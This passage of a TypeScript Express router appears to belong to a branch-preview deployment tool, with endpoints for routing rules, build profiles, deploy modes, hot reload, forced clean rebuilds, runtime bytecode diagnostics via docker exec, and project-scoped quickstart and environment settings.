      const result = await shell.exec(
        `git checkout ${entry.branch}`,
        { cwd: entry.worktreePath, timeout: 10_000 },
      );
      if (result.exitCode !== 0) {
        // Worktree may not have local branch, reset to origin
        const reset = await shell.exec(
          `git checkout -B ${entry.branch} origin/${entry.branch}`,
          { cwd: entry.worktreePath, timeout: 10_000 },
        );
        if (reset.exitCode !== 0) throw new Error(combinedOutput(reset));
      }

      entry.pinnedCommit = undefined;
      stateService.save();
      res.json({ message: '已恢复到分支最新提交' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Reset branch status ──

  router.post('/branches/:id/reset', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    entry.status = 'idle';
    entry.errorMessage = undefined;
    for (const svc of Object.values(entry.services)) {
      if (svc.status === 'error' || svc.status === 'building') {
        svc.status = 'idle';
        svc.errorMessage = undefined;
      }
    }
    stateService.save();
    res.json({ message: '分支状态已重置' });
  });

  // ── Routing rules CRUD ──

  router.get('/routing-rules', (req, res) => {
    // P4 Part 3b: optional ?project=<id> filter.
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const rules = projectFilter
      ? stateService.getRoutingRulesForProject(projectFilter)
      : stateService.getRoutingRules();
    res.json({ rules });
  });

  router.post('/routing-rules', (req, res) => {
    try {
      const rule = req.body as RoutingRule;
      if (!rule.id || !rule.type || !rule.match || !rule.branch) {
        res.status(400).json({ error: 'id、类型、匹配模式和目标分支为必填项' });
        return;
      }
      rule.priority = rule.priority ?? 0;
      rule.enabled = rule.enabled ?? true;
      // P4 Part 17 (G14 fix): mirror the B1 fix on POST /build-profiles
      // and POST /infra — honour the project scope so routing rules
      // created from a non-default project don't silently land in the
      // legacy default project. Source of truth: request body, with
      // ?project= query param as fallback. Validates the project exists
      // to prevent orphan routing rules.
      if (!rule.projectId) {
        const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
        rule.projectId = queryProject || 'default';
      }
      if (!stateService.getProject(rule.projectId)) {
        res.status(400).json({ error: `未知项目: ${rule.projectId}` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, rule.projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      stateService.addRoutingRule(rule);
      stateService.save();
      res.status(201).json({ rule });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.put('/routing-rules/:id', (req, res) => {
    try {
      // Project-key scope check (FU-04 isolation sweep): a project-
      // scoped Agent Key may only mutate routing rules in its own
      // project. Bootstrap key / cookie auth are unaffected.
      const existing = stateService.getRoutingRule(req.params.id);
      if (!existing) { res.status(404).json({ error: `路由规则 "${req.params.id}" 不存在` }); return; }
      const m = assertProjectAccess(req as any, existing.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
      // Refuse cross-project re-attribution via the body — auth check
      // above already verified the *current* owner; silently moving the
      // rule to another project would bypass that.
      if (req.body && typeof req.body === 'object' && 'projectId' in req.body
          && req.body.projectId !== (existing.projectId || 'default')) {
        res.status(403).json({ error: 'projectId 不可通过 PUT 修改' });
        return;
      }
      stateService.updateRoutingRule(req.params.id, req.body);
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/routing-rules/:id', (req, res) => {
    try {
      const existing = stateService.getRoutingRule(req.params.id);
      if (!existing) { res.status(404).json({ error: `路由规则 "${req.params.id}" 不存在` }); return; }
      const m = assertProjectAccess(req as any, existing.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
      stateService.removeRoutingRule(req.params.id);
      stateService.save();
      res.json({ message: '已删除' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Build profiles CRUD ──

  router.get('/build-profiles', (req, res) => {
    // P4 Part 3b: optional ?project=<id> filter.
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const source = projectFilter
      ? stateService.getBuildProfilesForProject(projectFilter)
      : stateService.getBuildProfiles();
    const profiles = source.map(p => ({
      ...p,
      env: p.env ? maskSecrets(p.env) : p.env,
    }));
    res.json({ profiles });
  });

  router.post('/build-profiles', (req, res) => {
    try {
      const profile = req.body as BuildProfile;
      // `command` is optional — Dockerfile-based services may rely on CMD/ENTRYPOINT
      if (!profile.id || !profile.name || !profile.dockerImage) {
        res.status(400).json({ error: 'id、名称、Docker 镜像为必填项' });
        return;
      }
      if (profile.command === undefined || profile.command === null) {
        profile.command = '';
      }
      profile.workDir = profile.workDir || '.';
      profile.containerPort = profile.containerPort || 8080;
      // P4 Part 16 (B1 fix): honor project scope — projectId can come
      // from request body (preferred) or ?project= query param fallback.
      // Without this fix, every new profile silently lands in the
      // legacy 'default' project regardless of which project the user
      // is configuring, breaking multi-project isolation entirely.
      if (!profile.projectId) {
        const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
        profile.projectId = queryProject || 'default';
      }
      // Validate the target project exists so we don't create orphans.
      if (!stateService.getProject(profile.projectId)) {
        res.status(400).json({ error: `未知项目: ${profile.projectId}` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, profile.projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      stateService.addBuildProfile(profile);
      stateService.save();
      res.status(201).json({ profile });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.put('/build-profiles/:id', (req, res) => {
    try {
      // Project-key scope check (FU-04 isolation sweep): see analogous
      // guard on /routing-rules/:id above.
      const existing = stateService.getBuildProfile(req.params.id);
      if (!existing) { res.status(404).json({ error: `构建配置 "${req.params.id}" 不存在` }); return; }
      const m = assertProjectAccess(req as any, existing.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
      if (req.body && typeof req.body === 'object' && 'projectId' in req.body
          && req.body.projectId !== (existing.projectId || 'default')) {
        res.status(403).json({ error: 'projectId 不可通过 PUT 修改' });
        return;
      }
      stateService.updateBuildProfile(req.params.id, req.body);
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/build-profiles/:id', (req, res) => {
    try {
      const existing = stateService.getBuildProfile(req.params.id);
      if (!existing) { res.status(404).json({ error: `构建配置 "${req.params.id}" 不存在` }); return; }
      const m = assertProjectAccess(req as any, existing.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
      stateService.removeBuildProfile(req.params.id);
      stateService.save();
      res.json({ message: '已删除' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Deploy mode switching ──

  // ── 全局批量改命令 (2026-04-22) ──
  //
  // 用户故事：「我的所有 .NET profile 都用同一套热/冷部署命令，能不能一次性改完？」
  //
  // POST /api/build-profiles/bulk-set-modes
  // body: {
  //   filter: 'all' | 'dotnet' | 'node' | 'python' | { dockerImageMatch: string },
  //   modes: { [modeId]: { label, command } },     // 要写入的所有 mode（覆盖该 profile 的全套）
  //   strategy: 'replace' | 'merge',                // replace: 清空后覆盖；merge: 同 modeId 替换、其他保留
  //   profileIds?: string[],                        // 可选：精准白名单，优先于 filter
  // }
  //
  // 自动在执行前拍 ConfigSnapshot，可在「历史版本」一键回滚。
  router.post('/build-profiles/bulk-set-modes', (req, res) => {
    try {
      const {
        filter = 'all',
        modes,
        strategy = 'merge',
        profileIds,
      } = req.body as {
        filter?: 'all' | 'dotnet' | 'node' | 'python' | { dockerImageMatch?: string };
        modes?: Record<string, { label: string; command: string }>;
        strategy?: 'replace' | 'merge';
        profileIds?: string[];
      };

      if (!modes || typeof modes !== 'object' || Object.keys(modes).length === 0) {
        res.status(400).json({ error: '必须提供 modes（{ modeId: { label, command } }）' });
        return;
      }
      for (const [k, v] of Object.entries(modes)) {
        if (!v || typeof v !== 'object' || !v.label || !v.command) {
          res.status(400).json({ error: `mode "${k}" 缺少 label 或 command` });
          return;
        }
      }

      const matchPattern: ((img: string) => boolean) = (() => {
        if (Array.isArray(profileIds)) return () => false;
        if (filter === 'all') return () => true;
        if (filter === 'dotnet') return img => /dotnet|mcr\.microsoft\.com\/dotnet/i.test(img);
        if (filter === 'node') return img => /node|node:|nodejs/i.test(img);
        if (filter === 'python') return img => /python/i.test(img);
        if (typeof filter === 'object' && filter.dockerImageMatch) {
          const re = new RegExp(filter.dockerImageMatch, 'i');
          return img => re.test(img);
        }
        return () => true;
      })();

      const allProfiles = stateService.getBuildProfiles();
      const targets = Array.isArray(profileIds) && profileIds.length > 0
        ? allProfiles.filter(p => profileIds.includes(p.id))
        : allProfiles.filter(p => matchPattern(p.dockerImage || ''));

      if (targets.length === 0) {
        res.status(400).json({ error: '没有匹配的 profile，请检查 filter / profileIds' });
        return;
      }

      // 自动快照（这是批量破坏性写入）
      const snapshot = stateService.createConfigSnapshot({
        trigger: 'pre-destructive',
        label: `批量设置 ${targets.length} 个 profile 的部署命令（${strategy}）`,
      });

      const updates: Array<{ id: string; modesBefore: number; modesAfter: number }> = [];
      for (const profile of targets) {
        const before = Object.keys(profile.deployModes || {}).length;
        const baseModes = strategy === 'replace' ? {} : { ...(profile.deployModes || {}) };
        for (const [mid, m] of Object.entries(modes)) {
          baseModes[mid] = { label: m.label, command: m.command };
        }
        stateService.updateBuildProfile(profile.id, { deployModes: baseModes });
        updates.push({ id: profile.id, modesBefore: before, modesAfter: Object.keys(baseModes).length });
      }
      stateService.save();

      stateService.recordDestructiveOp({
        type: 'other',
        snapshotId: snapshot.id,
        summary: `批量改 ${targets.length} 个 profile 的部署命令（filter=${typeof filter === 'string' ? filter : 'custom'}, strategy=${strategy}）`,
      });

      res.json({
        applied: true,
        targetCount: targets.length,
        targets: updates,
        snapshotId: snapshot.id,
        message: `已为 ${targets.length} 个 profile 应用新命令。如有问题在「历史版本」回滚。`,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.put('/build-profiles/:id/deploy-mode', (req, res) => {
    try {
      const { id } = req.params;
      const { mode } = req.body as { mode?: string };
      const profile = stateService.getBuildProfile(id);
      if (!profile) {
        res.status(404).json({ error: `构建配置 "${id}" 不存在` });
        return;
      }
      // Validate mode exists (or null/empty to reset to default)
      if (mode && (!profile.deployModes || !profile.deployModes[mode])) {
        const available = profile.deployModes ? Object.keys(profile.deployModes).join(', ') : '无';
        res.status(400).json({ error: `部署模式 "${mode}" 不存在，可用: ${available}` });
        return;
      }
      stateService.updateBuildProfile(id, { activeDeployMode: mode || undefined });
      stateService.save();
      const label = mode && profile.deployModes?.[mode]?.label || 'default';
      res.json({ message: `已切换为 ${label}`, mode: mode || null });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── 热更新开关（2026-04-22 新增）──
  // POST /api/build-profiles/:id/hot-reload  { enabled: boolean, mode?, command?, usePolling? }
  // 关掉热更新：只传 enabled=false，其他字段保留以便下次启用
  router.post('/build-profiles/:id/hot-reload', (req, res) => {
    try {
      const { id } = req.params;
      const { enabled, mode, command, usePolling } = req.body as {
        enabled?: boolean;
        mode?: 'dotnet-watch' | 'pnpm-dev' | 'vite' | 'next-dev' | 'custom';
        command?: string;
        usePolling?: boolean;
      };
      const profile = stateService.getBuildProfile(id);
      if (!profile) {
        res.status(404).json({ error: `构建配置 "${id}" 不存在` });
        return;
      }
      if (enabled === undefined) {
        res.status(400).json({ error: '必须传 enabled (true/false)' });
        return;
      }
      // 2026-04-22 —— .NET 默认 dotnet-run（快路径：MSBuild 增量 + kill/restart）。
      // MSBuild 增量绝大多数情况正确；极少数撒谎场景走 🧹 清理按钮 (force-rebuild)
      // 破缓存即可。dotnet-restart 保留但仅作疑难兜底，不是默认。
      const isDotnet = /dotnet|mcr\.microsoft\.com\/dotnet/i.test(profile.dockerImage || '');
      const defaultMode = isDotnet ? ('dotnet-run' as const) : ('pnpm-dev' as const);
      const current = profile.hotReload || { enabled: false, mode: defaultMode };
      const next = {
        enabled,
        mode: mode ?? current.mode,
        command: command ?? current.command,
        usePolling: usePolling ?? current.usePolling,
        cleanBeforeBuild: (req.body as { cleanBeforeBuild?: boolean })?.cleanBeforeBuild ?? (current as { cleanBeforeBuild?: boolean }).cleanBeforeBuild ?? true,
      };
      // mode=custom 时必须有 command
      if (next.enabled && next.mode === 'custom' && !next.command) {
        res.status(400).json({ error: 'mode=custom 时必须提供 command' });
        return;
      }
      stateService.updateBuildProfile(id, { hotReload: next });
      stateService.save();
      res.json({
        hotReload: next,
        message: next.enabled
          ? `已启用热更新（${next.mode}）。重启该服务让变更生效。`
          : '已关闭热更新。重启该服务回到标准编译命令。',
        requiresRestart: true,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── 强制干净重建（2026-04-22，对付 MSBuild 增量编译撒谎）──
  //
  // 场景：改了 .cs 文件 5 轮都没生效，DLL 里 grep 得到新字符串，运行进程日志却看不到。
  // 根因：MSBuild 增量编译误判「项目引用未变」跳过 compile，或 dotnet watch 只更新内存
  //       没重启进程 → 进程加载的字节码和磁盘 DLL 对不上。
  //
  // 本接口：停该 profile 的容器 → rm -rf bin/obj → 重启（重启后会 clean build）。
  // 对用 dotnet-restart 热更新模式的 profile 也适用，因为它的 cleanBeforeBuild 只在
  // 下次文件变更触发时清理，强制按钮让用户即时清理而不等变更。
  //
  // POST /api/branches/:branchSlug/force-rebuild/:profileId
  router.post('/branches/:branchSlug/force-rebuild/:profileId', async (req, res) => {
    const branchSlug = decodeURIComponent(req.params.branchSlug);
    const profileId = req.params.profileId;
    const branch = stateService.getBranch(branchSlug);
    const profile = stateService.getBuildProfile(profileId);
    if (!branch) { res.status(404).json({ error: `分支 "${branchSlug}" 不存在` }); return; }
    if (!profile) { res.status(404).json({ error: `构建配置 "${profileId}" 不存在` }); return; }

    const svc = branch.services?.[profileId];
    const containerName = svc?.containerName;
    const worktree = branch.worktreePath;
    if (!worktree) { res.status(400).json({ error: '分支无 worktreePath' }); return; }

    const steps: Array<{ step: string; ok: boolean; detail?: string }> = [];

    // 1) 停容器
    if (containerName) {
      try {
        await containerService.stop(containerName);
        steps.push({ step: `停止 ${containerName}`, ok: true });
      } catch (err) {
        steps.push({ step: `停止 ${containerName}`, ok: false, detail: (err as Error).message });
      }
    } else {
      steps.push({ step: '停止容器', ok: true, detail: '容器未运行，跳过' });
    }

    // 2) 物理删除 worktree 下目标 profile workDir 里的 bin / obj —— 绕过 MSBuild 增量
    const workDir = profile.workDir ? `${worktree}/${profile.workDir}` : worktree;
    const wipeCmd = `find ${shq(workDir)} -type d \\( -name bin -o -name obj \\) -prune -exec rm -rf {} + 2>/dev/null; echo done`;
    try {
      const result = await shell.exec(wipeCmd);
      if (result.exitCode !== 0) {
        steps.push({ step: 'rm -rf bin/obj', ok: false, detail: combinedOutput(result) });
      } else {
        steps.push({ step: 'rm -rf bin/obj', ok: true, detail: workDir });
      }
    } catch (err) {
      steps.push({ step: 'rm -rf bin/obj', ok: false, detail: (err as Error).message });
    }

    // 3) 触发部署（异步；响应立即返回，不堵 HTTP）
    // 部署接口是现成的，这里直接告诉用户去点"部署"；自动触发留给下一版
    steps.push({
      step: '触发重新部署',
      ok: true,
      detail: `已清理。请在分支卡片上点「部署」或等待 autoBuild 重启该服务。`,
    });

    stateService.recordDestructiveOp({
      type: 'other',
      projectId: branch.projectId || null,
      summary: `强制干净重建 ${branchSlug}:${profileId}（清 bin/obj）`,
    });

    res.json({
      branch: branchSlug,
      profile: profileId,
      workDir,
      steps,
      message: '已强制清理构建缓存。下次部署会从源码完整重编译。',
    });
  });

  // ── 运行时字节码一致性核验（2026-04-22 诊断工具）──
  //
  // 帮用户回答："我改的 .cs 到底生效了没有？"
  //
  // 三项对比：
  //   - 容器里 DLL 文件 mtime：echo $(stat /app/.../bin/.../*.dll | grep Modify)
  //   - 容器里 dotnet 进程 PID 启动时间：ps -o lstart -p $PID
  //   - 最近 50 行容器 stdout：看请求/日志是不是按新代码应有的行为走
  //
  // 如果 DLL mtime > 进程启动时间 → 进程加载的还是老字节码，需要重启。
  //
  // POST /api/branches/:branchSlug/verify-runtime/:profileId
  router.post('/branches/:branchSlug/verify-runtime/:profileId', async (req, res) => {
    const branchSlug = decodeURIComponent(req.params.branchSlug);
    const profileId = req.params.profileId;
    const branch = stateService.getBranch(branchSlug);
    if (!branch) { res.status(404).json({ error: `分支 "${branchSlug}" 不存在` }); return; }
    const svc = branch.services?.[profileId];
    const containerName = svc?.containerName;
    if (!containerName) {
      res.status(400).json({ error: `服务 "${profileId}" 未运行，无法诊断` });
      return;
    }
    const running = await containerService.isRunning(containerName).catch(() => false);
    if (!running) {
      const inspect = await shell.exec(`docker inspect --format="{{.State.Status}}" ${shq(containerName)}`).catch(err => ({
        exitCode: 1,
        stdout: '',
        stderr: (err as Error).message,
      }));
      const status = (inspect.stdout || '').trim();
      const detail = inspect.exitCode === 0 && status
        ? `容器 ${containerName} 当前状态为 ${status}，请先重新部署。`
        : `容器 ${containerName} 不存在或已被清理，请先重新部署。`;
      res.status(400).json({ error: `服务 "${profileId}" 未运行，无法诊断：${detail}` });
      return;
    }

    // 1) 进程启动时间
    const psCmd = `docker exec ${shq(containerName)} sh -c "ps -o lstart= -p 1 2>/dev/null || ps -o lstart= -p \\$(pgrep -f 'dotnet run' | head -1) 2>/dev/null || echo unknown"`;
    const ps = await shell.exec(psCmd).catch(err => ({ exitCode: 1, stdout: '', stderr: (err as Error).message }));

    // 2) DLL 时间戳（遍历 bin/ 下所有 .dll 取最新）
    const dllCmd = `docker exec ${shq(containerName)} sh -c "find . -name '*.dll' -path '*/bin/*' -printf '%T@ %p\\n' 2>/dev/null | sort -nr | head -5"`;
    const dll = await shell.exec(dllCmd).catch(err => ({ exitCode: 1, stdout: '', stderr: (err as Error).message }));

    // 3) 源码 .cs 最新改动时间
    const srcCmd = `docker exec ${shq(containerName)} sh -c "find . -name '*.cs' -not -path '*/bin/*' -not -path '*/obj/*' -printf '%T@ %p\\n' 2>/dev/null | sort -nr | head -1"`;
    const src = await shell.exec(srcCmd).catch(err => ({ exitCode: 1, stdout: '', stderr: (err as Error).message }));

    // 4) 最近 50 行日志
    const logs = await containerService.getLogs(containerName, 50).catch(() => '');

    // 解析和诊断
    const parseTop = (s: string) => {
      const first = s.split('\n').filter(Boolean)[0] || '';
      const [tsStr, ...pathParts] = first.split(/\s+/);
      const ts = parseFloat(tsStr);
      return { ts: Number.isFinite(ts) ? ts : null, path: pathParts.join(' ') };
    };

    const topDll = parseTop(dll.stdout || '');
    const topSrc = parseTop(src.stdout || '');

    const warnings: string[] = [];
    if (topSrc.ts && topDll.ts && topSrc.ts > topDll.ts) {
      warnings.push('⚠ 源码比 DLL 新：最新的 .cs 还没被编译进 DLL。说明容器内没跑重编译（watch 没触发或热更新没起）。');
    }
    // DLL 晚于进程启动时间 → 进程跑的还是老字节码
    const processStartStr = (ps.stdout || '').trim();
    if (topDll.ts && processStartStr && processStartStr !== 'unknown') {
      const procTs = Date.parse(processStartStr) / 1000;
      if (Number.isFinite(procTs) && topDll.ts > procTs + 5) {
        warnings.push(`⚠ DLL 比进程启动时间新 (Δ=${Math.round(topDll.ts - procTs)}s)：进程还在跑老字节码。重启服务或点「💥 强制干净重建」。`);
      }
    }
    if (warnings.length === 0) {
      warnings.push('✓ 未检测到明显不一致。如仍看不到预期日志，排查：日志级别过滤、LogError 是否真走到那个代码路径、Infrastructure.dll 是不是被引用/注入。');
    }

    res.json({
      branch: branchSlug,
      profile: profileId,
      container: containerName,
      processStart: processStartStr,
      latestDll: topDll,
      latestSource: topSrc,
      recentLogs: logs.split('\n').slice(-30).join('\n'),
      warnings,
    });
  });

  // ── Docker images (for dropdown selection) ──

  router.get('/docker-images', async (_req, res) => {
    try {
      const result = await shell.exec(
        `docker images --format '{"repo":"{{.Repository}}","tag":"{{.Tag}}","size":"{{.Size}}","id":"{{.ID}}"}'`,
        { timeout: 10_000 },
      );
      const images = result.stdout
        .trim()
        .split('\n')
        .filter(Boolean)
        .map(line => JSON.parse(line))
        .filter((img: { repo: string; tag: string }) => img.repo !== '<none>' && img.tag !== '<none>');
      res.json({ images });
    } catch {
      // Docker not accessible — return presets only
      res.json({ images: [] });
    }
  });

  // ── Package manager detection ──

  type PackageManager = 'npm' | 'pnpm' | 'yarn';

  /**
   * Detect the package manager for a Node.js project by checking lock files.
   * Priority: pnpm-lock.yaml > yarn.lock > package-lock.json > npm (default)
   */
  function detectPackageManager(projectDir: string): PackageManager {
    if (fs.existsSync(path.join(projectDir, 'pnpm-lock.yaml'))) return 'pnpm';
    if (fs.existsSync(path.join(projectDir, 'yarn.lock'))) return 'yarn';
    if (fs.existsSync(path.join(projectDir, 'package-lock.json'))) return 'npm';
    return 'npm';
  }

  // Cache base path is isolated per project. Servers keep /data by default;
  // desktop environments fall back to a writable local directory.
  const cacheBase = stateService.getCacheBase();

  /** Build command prefix and cache mount for a detected package manager */
  function nodeProfileCommands(pm: PackageManager) {
    switch (pm) {
      case 'pnpm':
        return {
          installPrefix: 'corepack enable && pnpm install --frozen-lockfile && ',
          runPrefix: 'corepack enable && pnpm exec ',
          cacheMounts: [{ hostPath: `${cacheBase}/pnpm`, containerPath: '/pnpm/store' }],
        };
      case 'yarn':
        return {
          installPrefix: 'corepack enable && yarn install --frozen-lockfile && ',
          runPrefix: 'corepack enable && yarn exec ',
          cacheMounts: [{ hostPath: `${cacheBase}/yarn`, containerPath: '/usr/local/share/.cache/yarn' }],
        };
      default:
        return {
          installPrefix: 'npm install && ',
          runPrefix: 'npx ',
          cacheMounts: [{ hostPath: `${cacheBase}/npm`, containerPath: '/root/.npm' }],
        };
    }
  }

  /**
   * Check if a build command uses pnpm/yarn without corepack enable prefix.
   * Returns a warning string or null if OK.
   */
  function checkCorepackPrefix(cmd: string | undefined, profileLabel: string): string | null {
    if (!cmd) return null;
    const needsCorepack = /\b(pnpm|yarn)\b/.test(cmd) && !/corepack\s+enable/.test(cmd);
    if (needsCorepack) {
      return `${profileLabel}: 命令使用了 pnpm/yarn 但缺少 "corepack enable &&" 前缀，在 node:*-slim 镜像中会失败`;
    }
    return null;
  }

  // ── Package manager detection API ──

  router.get('/detect-pm/:workDir', (_req, res) => {
    const workDir = _req.params.workDir;
    const fullPath = path.join(config.repoRoot, workDir);
    if (!fs.existsSync(fullPath)) {
      res.status(404).json({ error: `目录 "${workDir}" 不存在` });
      return;
    }
    const pm = detectPackageManager(fullPath);
    const commands = nodeProfileCommands(pm);
    res.json({ workDir, packageManager: pm, ...commands });
  });

  // ── Quickstart: seed default build profiles for this project ──

  router.post('/quickstart', (req, res) => {
    // Resolve project scope: ?project=<id> query, body.projectId, or
    // legacy 'default'. Without scoping, every project shared the
    // global build-profile list and "快速开始" on a fresh project
    // failed with 409 because the legacy project's profiles already
    // existed.
    const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
    const bodyProject = (req.body && typeof req.body.projectId === 'string') ? req.body.projectId : null;
    const projectId = bodyProject || queryProject || 'default';
    if (!stateService.getProject(projectId)) {
      res.status(400).json({ error: `未知项目: ${projectId}` });
      return;
    }

    const existing = stateService.getBuildProfilesForProject(projectId);
    if (existing.length > 0) {
      res.status(409).json({ error: '构建配置已存在。请先删除现有配置或手动添加。' });
      return;
    }

    // Use the project's actual repo root so stack detection looks at
    // the right tree. Legacy projects (no per-project repoPath) fall
    // back to config.repoRoot via getProjectRepoRoot.
    const projectRepoRoot = stateService.getProjectRepoRoot(projectId, config.repoRoot);
    const adminDir = path.join(projectRepoRoot, 'prd-admin');
    const pm = fs.existsSync(adminDir) ? detectPackageManager(adminDir) : 'npm';
    const nodeCmd = nodeProfileCommands(pm);

    // Look up the project up-front — we need the slug both for the
    // suffix convention (Task 2) and for all downstream ID collisions.
    // getProject can't be undefined here because we already validated
    // projectId above, but TS still needs the narrow.
    const project = stateService.getProject(projectId);
    const projectSlug = project?.slug || projectId;

    // addBuildProfile guards on global id uniqueness — the legacy
    // project already owns "api" / "admin" so non-legacy projects
    // must suffix their ids. Suffix uses the project slug (human
    // readable, e.g. "api-prd-agent-2") instead of the first 8 hex
    // chars of the id, because slugs survive state.json migrations
    // while hex UUIDs look like random noise in the topology view.
    const idSuffix = projectId === 'default' ? '' : `-${projectSlug}`;

    // Task 1: prefer a cds-compose file over the hardcoded template.
    // Only search inside the project's own git repo (projectRepoRoot).
    // Never search config.repoRoot — that is the CDS host directory shared
    // across all projects, so reading from it would let one project's compose
    // file silently contaminate a different project's build profiles.
    let composeYaml: string | null = null;
    const composeCandidates: string[] = [
      path.join(projectRepoRoot, 'cds-compose.yaml'),
      path.join(projectRepoRoot, 'cds-compose.yml'),
    ];
    // De-duplicate paths (projectRepoRoot may equal config.repoRoot for legacy)
    const seen = new Set<string>();
    for (const composePath of composeCandidates) {
      if (seen.has(composePath)) continue;
      seen.add(composePath);
      if (fs.existsSync(composePath)) {
        try {
          composeYaml = fs.readFileSync(composePath, 'utf8');
          break;
        } catch {
          // Fall through to the next candidate / hardcoded template.
        }
      }
    }

    if (composeYaml) {
      const parsed = parseCdsCompose(composeYaml);
      if (parsed && parsed.buildProfiles.length > 0) {
        const seeded: BuildProfile[] = [];
        for (const bp of parsed.buildProfiles) {
          const profile: BuildProfile = {
            ...bp,
            id: `${bp.id}${idSuffix}`,
            projectId,
          };
          stateService.addBuildProfile(profile);
          seeded.push(profile);
        }

        // Merge envVars — never clobber user-authored vars. Since the
        // compose belongs to this project, seed values into the project
        // scope (so e.g. a JWT_SECRET from cds-compose.yaml doesn't leak
        // into sibling projects). Skip when either global OR project
        // already has the key — both are user-authored sources of truth.
        const mergedExisting = stateService.getCustomEnv(projectId);
        for (const [key, value] of Object.entries(parsed.envVars)) {
          if (mergedExisting[key] === undefined) {
            stateService.setCustomEnvVar(key, value, projectId);
          }
        }

        // Add infra services only when this project doesn't already
        // have one with the same id. Scope to projectId so two projects
        // can both declare their own `mongo` without colliding in the
        // global infraServices list.
        const existingInfra = stateService.getInfraServicesForProject(projectId);
        const existingInfraIds = new Set(existingInfra.map(s => s.id));
        for (const def of parsed.infraServices) {
          if (existingInfraIds.has(def.id)) continue;
          const service = composeDefToInfraService(def, projectId);
          stateService.addInfraService(service);
        }

        stateService.save();

        // Report env vars that still have TODO placeholder values so the
        // frontend can open the env editor immediately after quickstart.
        const allProjectEnv = stateService.getCustomEnv(projectId);
        const pendingEnvVars = Object.entries(allProjectEnv)
          .filter(([, v]) => typeof v === 'string' && v.startsWith('TODO:'))
          .map(([k]) => k);

        res.status(201).json({
          message: `快速启动: 已从 cds-compose.yaml 创建 ${seeded.length} 个构建配置`,
          profiles: seeded,
          detectedPackageManager: pm,
          source: 'cds-compose',
          pendingEnvVars,
        });
        return;
      }
    }

    // Fallback: hardcoded template (pre-cds-compose.yaml projects).
    const defaults: BuildProfile[] = [
      {
        id: 'api',
        projectId,
        name: 'Backend API (.NET 8)',
        dockerImage: 'mcr.microsoft.com/dotnet/sdk:8.0',
        workDir: 'prd-api',
        command: 'dotnet restore && dotnet build --no-restore && dotnet run --no-build --project src/PrdAgent.Api/PrdAgent.Api.csproj --urls http://0.0.0.0:8080',
        containerPort: 8080,
        cacheMounts: [
          { hostPath: `${cacheBase}/nuget`, containerPath: '/root/.nuget/packages' },
        ],
      },
      {
        id: 'admin',
        projectId,
        name: 'Admin Panel (Vite)',
        dockerImage: 'node:20-slim',
        workDir: 'prd-admin',
        command: `${nodeCmd.installPrefix}${nodeCmd.runPrefix}vite --host 0.0.0.0 --port 5173`,
        containerPort: 5173,
        cacheMounts: nodeCmd.cacheMounts,
        // Wait for Vite to fully initialize (CSS/plugin pipeline ready) before routing traffic.
        // Without this, the proxy forwards requests while Vite is still starting, causing
        // CSS MIME type errors (Vite returns HTML fallback before transforms are ready).
        startupSignal: '➜  Network:',
      },
    ];

    for (const profile of defaults) {
      profile.id = `${profile.id}${idSuffix}`;
      stateService.addBuildProfile(profile);
    }
    stateService.save();

    res.status(201).json({
      message: `快速启动: 已创建 ${defaults.length} 个构建配置 (检测到包管理器: ${pm})`,
      profiles: defaults,
      detectedPackageManager: pm,
      source: 'template',
    });
  });

  // ── Custom environment variables (scoped: _global + per-project) ──
  //
  // Every endpoint accepts an optional `?scope=_global|<projectId>`
  // query. When omitted it defaults to `_global` so pre-feature
  // clients (that had no scope concept) keep working untouched.
  //
  // Only `_global` vars participate in syncCdsConfig() (rootDomains /
  // repoRoot etc. must be process-wide). Project-scoped vars go
  // straight into container env at deploy time.

  function resolveScopeAndSource(req: import('express').Request): { scope: string; fromBody: boolean } {
    // Phase 7 fix(B14,2026-05-01):同时接受 ?scope= query 和 body.scope。
    // 历史上只读 query,导致 PUT /api/env body 里写 scope 被静默忽略,环境
    // 变量落到错误的 _global 作用域。Twenty 实战暴露。
    //
    // Bugbot fix(PR #521 第九轮 Bug 1)— 暴露 scope 来源,让调用方能区分
    // body.scope 是"meta 字段"还是"真 env var"。当 ?scope= 已显式指定时,
    // body.scope 是用户的真实 env(不该被剥),仅当 ?scope= 缺失而 body.scope
    // 用作 meta 时才需要剥。
    const raw = req.query.scope;
    const queryScope = typeof raw === 'string' ? raw.trim() : '';
    if (queryScope) return { scope: queryScope, fromBody: false };
    const bodyScope = req.body && typeof req.body === 'object' && typeof (req.body as Record<string, unknown>).scope === 'string'
      ? ((req.body as Record<string, string>).scope).trim()
      : '';
    return { scope: bodyScope || '_global', fromBody: !!bodyScope };
  }

  function resolveScope(req: import('express').Request): string {
    return resolveScopeAndSource(req).scope;
  }

  router.get('/env', (req, res) => {
    const scope = resolveScope(req);
    // /env?scope=_all — give the Settings UI the full scoped map in one
    // round trip so it can render both global and per-project vars.
    if (scope === '_all') {
      res.json({ env: stateService.getCustomEnvRaw(), scope: '_all' });
      return;
